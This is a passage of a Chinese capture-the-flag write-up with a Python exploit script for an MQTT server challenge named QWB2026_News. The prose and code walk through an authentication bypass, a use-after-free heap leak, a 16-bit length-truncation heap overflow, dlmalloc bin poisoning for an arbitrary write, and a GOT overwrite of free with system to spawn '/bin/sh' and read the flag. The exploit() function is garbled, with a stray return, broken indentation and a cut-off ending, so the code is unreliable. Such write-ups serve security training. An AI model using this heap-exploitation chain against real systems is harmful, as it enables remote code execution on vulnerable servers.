Step 2: 三个漏洞 → 一条”任意写”链
认证绕过
：用户名比较是
strncmp(xor(user), "LJ_/-/+B\ypts", user_len)
，
user_len
来自 帧里我们给的长度；只发 1 字节
'Q'
（
'Q'^0x1d='L'
）即可通过。
堆泄漏
：订阅两个 32 字节 topic 再退订，然后
PUBLISH QWB2026_News <32B>
。
F_37d8
在
entry->size < 33
时先
free(entry->buf)
再组包广播，于是把 freed chunk 的 fastbin
fd
原样回显 → 堆指针。
64 KiB 溢出
：广播组包
F_2610
里
p3 = malloc((u16)(hdrbytes + hdr_len + payload_len))
，拷贝却是
payload_len
。
payload_len = 65520
时
total3 = (u16)(2+16+65520) = 2
→
malloc(2)
+ 64 KiB 拷贝， 而且
p3
恰好是 0x20 类的第三次 malloc（落点很低），溢出从
p3+18
覆盖整个堆。
任意 malloc 返回 → entry 表改写
：dlmalloc 的
small-bin pop 不检查
：
bin->bk = victim->bk; *(victim->bk + 0x10) = bin_at; return victim+0x10
。 把
victim->bk
改成
F
，下一次同类 malloc 就返回
F+0x10
。 于是两次 0x50 类 malloc（pop victim → pop F）让
PUBLISH
的 store malloc 返回
&entry[11]+8
，store 的
memset+memcpy
直接把 entry 表改写成
{len=24, buf=目标, size=8}
。
任意写
：条目被改写后再 PUBLISH 到该 topic，
F_3a34
走
entry->size >= payload_len
的
复用分支
：
memset(entry->buf,0,size); memcpy(entry->buf,payload,pl)
—— 目标地址 完全由我们决定，长度最多 64 KiB。
Step 3: 不碰栈，直接偷 libc 并劫持 GOT
栈溢出那条路（carry≥5 的巨型
read
）需要
单次 read 拿到 ~98 KB
，而 RTT≈57 ms， 服务器会在第一段 TCP 到达时就返回，永远覆盖不到
fp+0x18068
。于是改走：
假 chunk 偷 libc
：在一条我们完全控制的 200 字节缓冲区里伪造一个 chunk （
size=0x61
，并伪造”下一个 chunk 在用”以跳过合并）。用 0x30 类的 double-pop 让 store malloc 返回它，
entry[0].buf = FAKE+0x10
且
size=32 < 33
，于是
F_37d8
立刻
free()
这个假 chunk → dlmalloc 把它链进 unsorted bin，把
mstate 指针
写进
FAKE+0x10/0x18
；紧接着的 broadcast 从同一地址拷 32 字节发给客户端 →
libc = leaked_word - 0xc2d48
（bin0 伪 chunk 偏移）。
GOT 劫持
：再走一次 0x50 类 double-pop 把
entry[11].buf
改成
&GOT[__libc_free]
、
size=8
，PUBLISH 8 字节 =
system
→
GOT[__libc_free] = system
。
触发
：先
PUBLISH '/bin/sh\0'
让
entry[1].buf
内容就是命令字符串，再 PUBLISH 一个 更大的 payload 走 grow 分支：
free(旧缓冲区)
→
system("/bin/sh")
→ 拿到 shell，
cat /flag*
。

#!/usr/bin/env python3
"""QWB2026_News (oldsvr) exploit - MIPS64 big-endian MQTT server, uClibc 1.0.32 dlmalloc.

  1. auth bypass (length-truncating strncmp) + 32B-topic UAF echo  -> heap base
  2. pie_base = heap_base - 0x22000 (qemu-user puts the brk right after the image)
  3. groom two isolated free chunks (0x30-class H30, 0x50-class V50) and a fully
     controlled 200-byte buffer that hosts a fake chunk
  4. PUBLISH with payload_len 65520: 16-bit truncation makes the packet buffer
     malloc(2) while memcpy writes 64 KiB -> overflow from p3+18 poisons
     H30->bk = FAKE and V50->bk = &entry[11]-8
  5. pop H30, then a news PUBLISH makes the store malloc() return FAKE+0x10; that
     buffer is freed at once (size<33), dlmalloc bins the *fake* chunk and writes
     mstate pointers into it; the broadcast copies them back -> libc base
  6. pop V50 twice -> store malloc() returns &entry[11]+8; entry table rewritten to
     {len=24, buf=&GOT[free], size=8}
  7. publish system()'s address -> GOT[__libc_free] = system
  8. publish "/bin/sh", then a bigger payload: grow path frees the old buffer
     -> system("/bin/sh") -> cat /flag*
"""
import socket
import struct
import sys
import time

NEWS = b'QWB2026_News'
PWD = bytes.fromhex('70770162cfd6')
A32 = b'A' * 32
B32 = b'B' * 32
T7 = b'SEVEN77'
# entry 1  (shell string)
T5 = b'FIVER'
# entry 2  (drives the 0x50 pops)
T4 = [b'%04d' % i for i in range(8)]
# entries 3..10 (0x20-class padding)
TG = b'X' * 24
# entry 11 (rewrite target)
TX = b'Y' * 32
# entry 12 (builds the high 0x30 chunk)
VIC = b'W' * 56
# entry 13 (0x50-class victim)
H = lambda v: struct.pack('>Q', v)

SHIFT = 0x70
# remote heap prelude (stdio FILE chunk)
PIE_FROM_HEAP = 0x22000
# verified with an oracle
BIN0_OFF = 0xc2d48
# libc offset of mstate->bins[0] pseudo-chunk
SYSTEM_OFF = 0x65370
# libc offset of system()
PL = 65520
# payload_len that triggers the 16-bit truncation
def varint(n):
    out = b''
    while True:
        b = n % 128
        n //= 128
        if n:
            out += bytes([b | 0x80])
        else:
            return out + bytes([b])


def frame(t, body):
    return bytes([t]) + varint(len(body)) + body


def connect_pkt():
    vh = b'\x00\x04MQTT\x04\xc2\x43\x21'
    pl = (struct.pack('>H', 10) + b'QWB_Client' +
          struct.pack('>H', 1) + b'Q' +
          struct.pack('>H', len(PWD)) + PWD)
    return frame(0x10, vh + pl)


def sub_pkt(topic, pid):
    return frame(0x82, struct.pack('>H', pid) + struct.pack('>H', len(topic)) + topic + b'\x00')


def unsub_pkt(topic, pid):
    return frame(0xA2, struct.pack('>H', pid) + struct.pack('>H', len(topic)) + topic)


def pub_pkt(topic, payload):
    return frame(0x30, struct.pack('>H', len(topic)) + topic + payload)


class Conn:
    def __init__(self, host, port):
        self.s = socket.create_connection((host, port), timeout=10)
        self.s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        self.s.settimeout(3)

    def send(self, data):
        self.s.sendall(data)

    def drain(self, t=0.8):
        self.s.settimeout(t)
        out = b''
        while True:
            try:
                d = self.s.recv(65536)
            except (socket.timeout, OSError):
                break
            if not d:
                break
            out += d
        return out

    def step(self, data, t=0.8):
        self.send(data)
        return self.drain(t)


def exploit(c, log=print):

    c.step(sub_pkt(B32, 3))

    c.step(unsub_pkt(B32, 5))

        return False

    c.step(pub_pkt(T5, b'B' * 56), 1.2)

# entry11.len = 24
